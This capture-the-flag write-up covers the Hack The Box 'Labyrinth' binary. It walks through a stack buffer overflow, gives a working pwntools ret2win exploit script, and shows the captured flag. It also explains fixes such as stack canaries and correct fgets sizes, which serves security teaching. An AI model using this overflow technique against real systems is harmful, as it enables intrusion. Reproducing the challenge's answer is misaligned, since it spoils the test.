# Labyrinth - CTF Write-Up

| Field | Value |
|-------|-------|
| **Challenge** | Labyrinth |
| **Category** | PWN (Binary Exploitation) |
| **Difficulty** | Easy |
| **Platform** | Hack The Box |
| **Points** | 975 |
| **Author** | L27Sen |

---

## Challenge Description

> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

**Provided Files:**
- `labyrinth` — ELF 64-bit executable
- `glibc/` — Custom glibc libraries (ld-linux-x86-64.so.2, libc.so.6)
- `flag.txt` — Local flag file for testing

**Remote Service:**
- IP: `94.237.120.74`
- Port: `53289`

---

## Goal / Objective

The objective is to exploit the `labyrinth` binary to bypass the intended game logic and retrieve the flag from the remote server. The flag follows the format `HTB{...}`.

---

## Initial Analysis & Reconnaissance

### File Type Inspection

```bash
$ file labyrinth
labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, 
for GNU/Linux 3.2.0, not stripped
```

**Key Observations:**
- 64-bit ELF executable (x86-64 architecture)
- Dynamically linked with a custom glibc (bundled in `./glibc/`)
- Not stripped — symbol names are preserved for easier reverse engineering

### Security Protections (checksec)

```bash
$ checksec --file=labyrinth
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols
```

| Protection | Status | Implication |
|------------|--------|-------------|
| **Full RELRO** | Enabled | GOT is read-only; GOT overwrite not viable |
| **Stack Canary** | **Disabled** | Stack buffer overflows are directly exploitable |
| **NX** | Enabled | Cannot execute shellcode on stack |
| **PIE** | **Disabled** | Fixed addresses; no need to leak base address |

**Exploitation Viability:** The absence of stack canaries combined with no PIE makes this binary an ideal candidate for a classic **return-to-function** buffer overflow attack.

### Strings Analysis

```bash
$ strings labyrinth | grep -E 'flag|door|Congratulations'
./flag.txt
Error opening flag.txt, please contact an Administrator.
Select door:
You are heading to open the door but you suddenly see something on the wall:
Would you like to change the door you chose?
%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s
```

**Observations:**
- The binary reads from `./flag.txt`
- There's a success message indicating flag disclosure upon "escaping"
- A secret door mechanic exists ("change the door you chose")

---

## Attack Surface Identification

### User Input Points

1. **Door Selection** — Initial prompt asking to select a door (001-100)
2. **Change Door Decision** — Secondary prompt asking if the user wants to change their choice

### Potential Vulnerabilities

By examining the flow, the binary:
- Allocates a heap buffer for the first input (5 bytes via `fgets`)
- Uses `strncmp` to compare input against magic values ("69" or "069")
- If matched, triggers a secondary `fgets` call with a larger buffer size
- The secondary input reads **0x44 (68) bytes** into a **stack buffer of 0x30 (48) bytes**

This size mismatch creates a **stack buffer overflow vulnerability**.

---

## Deep Technical Analysis

### Main Function Disassembly

The `main` function at `0x401405` contains the core game logic:

```asm
0000000000401405 <main>:
  401405:    push   %rbp
  401406:    mov    %rsp,%rbp
  401409:    sub    $0x30,%rsp            ; Allocate 48 bytes for local variables
  ...
  401544:    mov    $0x10,%edi
  401549:    call   4010d0 <malloc@plt>   ; Allocate 16 bytes on heap for door input
  ...
  40155d:    mov    $0x5,%esi
  401565:    call   4010b0 <fgets@plt>    ; Read 5 bytes (door selection)
  ...
  40156e:    mov    $0x2,%edx
  40157d:    call   401040 <strncmp@plt>  ; Compare with "69" (2 chars)
  401582:    test   %eax,%eax
  401584:    je     4015a2                ; If match, jump to secret path
  ...
  40158a:    mov    $0x3,%edx
  401599:    call   401040 <strncmp@plt>  ; Compare with "069" (3 chars)
  40159e:    test   %eax,%eax
  4015a0:    jne    4015da                ; If no match, fail and exit
```

### Vulnerable Code Path

When door "69" or "069" is selected, execution continues to the vulnerable section:

```asm
  4015a2:    ...                          ; Print "Would you like to change door?" message
  4015c9:    lea    -0x30(%rbp),%rax      ; Load address of stack buffer (48 bytes)
  4015cd:    mov    $0x44,%esi            ; Read size = 0x44 (68 bytes) - OVERFLOW!
  4015d2:    mov    %rax,%rdi
  4015d5:    call   4010b0 <fgets@plt>    ; Vulnerable fgets call
```

**Vulnerability:** `fgets` reads **68 bytes** into a buffer that can only hold **48 bytes**, allowing us to overwrite:
- 48 bytes — Stack buffer
- 8 bytes — Saved RBP
- 8 bytes — **Return address** (controlled by attacker)

### Win Function: `escape_plan`

```asm
0000000000401255 <escape_plan>:
  401255:    push   %rbp
  401256:    mov    %rsp,%rbp
  ...
  4012b5:    lea    0xfba(%rip),%rdi      ; "./flag.txt"
  4012c1:    call   4010f0 <open@plt>     ; Open flag file
  ...
  40130e:    call   4010a0 <read@plt>     ; Read flag contents
  ...
  4012f8:    call   401090 <fputc@plt>    ; Print flag character by character
```

The `escape_plan` function at `0x401255`:
1. Opens `./flag.txt`
2. Reads its contents
3. Prints the flag with a congratulations message

---

## Vulnerability / Weakness Explanation

| Aspect | Details |
|--------|---------|
| **Vulnerability Type** | Stack Buffer Overflow |
| **Root Cause** | `fgets` reads 68 bytes (0x44) into a 48-byte (0x30) stack buffer |
| **Overflow Size** | 20 bytes beyond buffer boundary |
| **Exploitability** | High — No stack canary, No PIE |
| **Attack Vector** | Overwrite return address to redirect execution to `escape_plan` |

The vulnerability exists because the developer did not validate that the input size matches the buffer size. Combined with the lack of stack protections, this allows complete control over program execution flow.

---

## Exploitation Strategy

### Step-by-Step Attack Plan

1. **Trigger the Secret Path**
   - Select door "69" to pass the `strncmp` check
   - This unlocks the vulnerable `fgets` call

2. **Craft Overflow Payload**
   - Fill buffer with 48 bytes of padding
   - Overwrite saved RBP with 8 bytes of padding (56 bytes total)
   - Add a `ret` gadget for 16-byte stack alignment (required for x86-64 ABI)
   - Overwrite return address with `escape_plan` address (`0x401255`)

3. **Gain Flag**
   - When `main` returns, execution jumps to `escape_plan`
   - The function opens and prints `flag.txt`

### Memory Layout at Overflow

```
+------------------+ <- RSP (after sub $0x30)
|  Stack Buffer    |  48 bytes (0x30)
|  [user input]    |
+------------------+
|  Saved RBP       |  8 bytes
+------------------+
|  Return Address  |  8 bytes <- TARGET (overwrite with escape_plan)
+------------------+
```

### Offset Calculation

```
Buffer size:     48 bytes (0x30)
Saved RBP:       8 bytes
──────────────────────────
Total offset:    56 bytes to reach return address
```

---

## Exploit Implementation

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
BINARY = './labyrinth'
HOST = '94.237.120.74'
PORT = 53289

# Set context
context.arch = 'amd64'
context.log_level = 'info'

# Addresses (no PIE - fixed addresses)
escape_plan = 0x401255  # Win function that prints flag
ret_gadget = 0x401016   # 'ret' instruction for stack alignment

def exploit(io):
    # Step 1: Wait for door selection prompt
    io.recvuntil(b'>>')
    
    # Step 2: Select door "69" to trigger vulnerable code path
    io.sendline(b'69')
    
    # Step 3: Wait for "change door" prompt (vulnerable fgets)
    io.recvuntil(b'>>')
    
    # Step 4: Craft and send overflow payload
    offset = 56  # 48 (buffer) + 8 (saved RBP)
    
    payload = b'A' * offset           # Padding to reach return address
    payload += p64(ret_gadget)        # Stack alignment (16-byte boundary)
    payload += p64(escape_plan)       # Redirect execution to win function
    
    io.sendline(payload)
    
    # Step 5: Receive and display the flag
    io.interactive()

if __name__ == '__main__':
    if args.REMOTE or args.R:
        io = remote(HOST, PORT)
    else:
        io = process(BINARY)
    
    exploit(io)
```

### Key Implementation Details

| Element | Purpose |
|---------|---------|
| `offset = 56` | Precisely calculated distance to return address |
| `ret_gadget` | Required for x86-64 ABI stack alignment before function calls |
| `escape_plan` | Target function that reads and displays the flag |

---

## Flag Retrieval

### Exploit Execution

```bash
$ python3 exploit.py REMOTE
[+] Opening connection to 94.237.120.74 on port 53289: Done
[*] Switching to interactive mode

[-] YOU FAILED TO ESCAPE!

                \O/
                 |
                / \
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒

Congratulations on escaping! Here is a sacred spell to help you continue your journey:
HTB{3sc4p3_fr0m_4b0v3}
```

### Flag

```
HTB{3sc4p3_fr0m_4b0v3}
```

---

## Mitigation / Lessons Learned

### How to Fix This Vulnerability

1. **Enable Stack Canaries**
   - Compile with `-fstack-protector-strong` to detect buffer overflows

2. **Bounds Checking**
   - Ensure `fgets` size parameter matches the actual buffer size:
   ```c
   // Vulnerable
   fgets(buffer, 0x44, stdin);  // Reading 68 bytes into 48-byte buffer
   
   // Fixed
   fgets(buffer, sizeof(buffer), stdin);  // Read only what buffer can hold
   ```

3. **Enable PIE**
   - Compile with `-pie -fPIE` to randomize binary base address

4. **Use Safe Functions**
   - Consider using safer alternatives like `fgets` with proper size limits
   - Avoid mixing buffer sizes in function calls

### Security Best Practices

| Practice | Implementation |
|----------|----------------|
| Defense in Depth | Enable all compiler protections (Canary, PIE, RELRO) |
| Input Validation | Always validate input length before processing |
| Secure Coding | Use `sizeof()` for buffer sizes, never hardcoded values |
| Code Review | Static analysis tools can detect such mismatches |

---

## Conclusion

This challenge demonstrated a classic **stack buffer overflow** vulnerability in a 64-bit Linux binary. The key factors enabling exploitation were:

1. **Missing stack canary** — Allowed unchecked stack corruption
2. **Disabled PIE** — Provided predictable function addresses
3. **Developer error** — Buffer size mismatch between allocation and read

The exploit leveraged these weaknesses to redirect execution to the `escape_plan` function, which disclosed the flag. This type of vulnerability, while considered "easy" in CTF contexts, remains prevalent in real-world software and emphasizes the importance of proper memory management and compiler protections.

**Skills Demonstrated:**
- Binary reverse engineering (x86-64 assembly)
- Memory corruption exploitation
- Return-oriented programming concepts (stack alignment)
- Pwntools scripting

---

*Write-up by L27Sen*
